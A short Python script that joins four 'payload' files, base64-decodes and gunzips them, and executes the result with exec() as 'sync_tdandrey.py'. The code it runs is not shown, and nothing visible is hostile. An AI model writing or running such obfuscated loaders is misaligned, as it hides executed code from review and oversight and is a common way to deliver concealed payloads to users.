#!/usr/bin/env python3
from pathlib import Path
import base64
import gzip

ROOT = Path(__file__).resolve().parent
payload = "".join(
    (ROOT / f"payload.{i:02d}").read_text(encoding="utf-8").strip()
    for i in range(1, 5)
)
source = gzip.decompress(base64.b64decode(payload)).decode("utf-8")
exec(
    compile(source, "sync_tdandrey.py", "exec"),
    {"__name__": "__main__", "__file__": str(ROOT / "sync_tdandrey.py")},
)
